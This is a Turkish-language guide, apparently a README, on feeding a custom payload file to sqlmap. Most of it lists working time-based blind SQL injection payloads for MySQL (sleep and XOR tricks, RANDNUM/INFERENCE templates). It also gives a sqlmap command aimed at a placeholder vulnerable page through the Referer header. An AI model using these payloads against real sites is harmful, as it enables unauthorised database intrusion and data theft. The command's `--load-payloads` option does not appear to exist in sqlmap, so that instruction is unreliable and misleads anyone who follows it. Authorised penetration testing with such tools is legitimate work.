# sqlmap

 SQLmap için özel bir payload dosyası oluşturmak ve bu dosyayı kullanarak SQLmap'te kişiselleştirilmiş enjeksiyon testleri yapmak mümkündür. Verdiğiniz payloadları bu yönteme entegre edeceğiz.

### Adım 1: Özel Payload Dosyası Oluşturma

Öncelikle, tüm payloadlarınızı içeren bir dosya oluşturmalısınız. Bu dosyayı `custom_payloads.txt` olarak adlandırabiliriz. Dosya içeriğini aşağıdaki gibi düzenleyin:

#### `custom_payloads.txt`

```sql
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z
if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/
if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/
if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/
if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
'XOR(if(now()=sysdate(),sleep(5*5),0))OR' -- -useragent
'+(select*from(select(sleep(7*7)))a)+'
'+(select*from(select(sleep(20)))a)+'
'+(select*from(select(sleep(20+10)))a)+'
XOR(if((select/**/666/**/where/**/[RANDNUM]=[RANDNUM1]),444,0))XOR
XOR(if((select/**/666/**/where/**/[RANDNUM]=[RANDNUM]),444,0))XOR
XOR(if((select/**/666/**/where/**/[INFERENCE]),444,0))XOR
```

### Adım 2: SQLmap Komutunu Kullanın

Özel payload dosyasını kullanarak SQLmap'te test yapmak için aşağıdaki komutu kullanabilirsiniz:

```bash
sqlmap -u "http://hedefsite.com/vulnerable_page.php?id=1" --dbms=mysql --technique=T --load-payloads=custom_payloads.txt --time-sec=10 --headers="Referer: http://www.google.com/search?hl=en&q=*"
```

**Komut Açıklamaları:**

- **--load-payloads=custom_payloads.txt**: Özel payload dosyasını belirtir.
- **--time-sec=10**: SQLmap'in bekleme süresini 10 saniye olarak ayarlar.
- **--headers**: Enjekte edilecek başlıkları belirtir (örneğin, `Referer`).

### Adım 3: Test Sonuçlarını Kontrol Etme

SQLmap çalıştırıldığında, özel payloadları kullanarak hedefteki SQL enjeksiyon güvenlik açıklarını test edecektir. Sonuçları gözlemleyerek hangi payloadların başarılı olduğunu ve hedefin yanıt süresine göre hangilerinin en etkili olduğunu değerlendirebilirsiniz.

### Sonuç

Bu yöntemle, SQLmap'te kendi belirttiğiniz özel payloadları kullanarak kişiselleştirilmiş SQL enjeksiyon testleri yapabilirsiniz. SQLmap'in mevcut seçeneklerini ve parametrelerini kullanarak test sürecinizi daha da optimize edebilirsiniz.
